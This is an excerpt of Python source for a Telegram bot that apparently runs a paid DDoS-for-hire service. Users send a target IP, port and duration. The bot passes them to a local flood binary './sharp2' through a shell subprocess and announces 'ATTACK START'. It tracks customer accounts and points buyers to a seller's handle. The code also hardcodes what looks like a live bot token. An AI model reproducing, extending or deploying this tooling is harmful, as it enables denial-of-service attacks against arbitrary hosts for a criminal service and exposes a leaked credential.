...
TOKEN = '7029774286:AAFKwDaT3fQBJ3ZAdhgSN0MXWWaevUU2G5k'
ADMIN_USER_ID = 5879359815  # Replace with the actual admin user ID
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    process2 = await asyncio.create_subprocess_shell(f"./sharp2 {target_ip} {target_port} {duration}")
...
def process_attack_command(message):
    try:
        ...
        if len(args) != 3:
            bot.send_message(message.chat.id, "*🚀 USER--->/ATTACK IP PORT TIME*", parse_mode='Markdown')
            return
        ...
        bot.send_message(message.chat.id, f"*ATTACK START 🚀\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
    except Exception as e:
...
def send_welcome(message):
    ...
    btn6 = KeyboardButton("CHECK ACCOUNT 💳")
...
def handle_message(message):
    if message.text == "":
        ...
        bot.reply_to(message, "*🚀 USER---> IP PORT TIME*", parse_mode='Markdown')
    ...
    elif message.text == "CHECK ACCOUNT 💳":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            ...
            response = "*No account information found. Please contact the administrator.@itzmd808sahil_SELLER*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "HElP ☠️":
        bot.reply_to(message, "*DM--> @itzmd808sahil_SELLER*", parse_mode='Markdown')
